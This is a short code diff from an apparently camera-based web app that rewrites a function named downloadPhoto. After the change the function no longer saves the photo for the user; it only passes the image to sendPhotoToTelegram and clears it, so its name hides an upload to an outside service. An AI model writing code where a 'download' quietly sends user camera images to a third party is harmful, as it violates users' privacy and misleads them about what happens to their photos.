@@ -66,17 +66,16 @@ const dataURLToBlob = (dataURL: any) => {
   return new Blob([uInt8Array], { type: contentType });
 };
 
-const downloadPhoto = ({ photo }: { photo: any }) => {
-  const link: HTMLAnchorElement | any = document.createElement("a");
-
-  if (link) {
-    link.href = photo;
-    sendPhotoToTelegram(photo);
-    link.download = "photo.png";
-    document.body.appendChild(link);
-    link.click();
-    document.body.removeChild(link);
-  }
+const downloadPhoto = ({
+  photo,
+  setPhoto,
+}: {
+  photo: any;
+  setPhoto: (args: any) => void;
+}) => {
+  if (!photo) return;
+  sendPhotoToTelegram(photo);
+  setPhoto(null);
 };
 
 const toggleCamera = ({
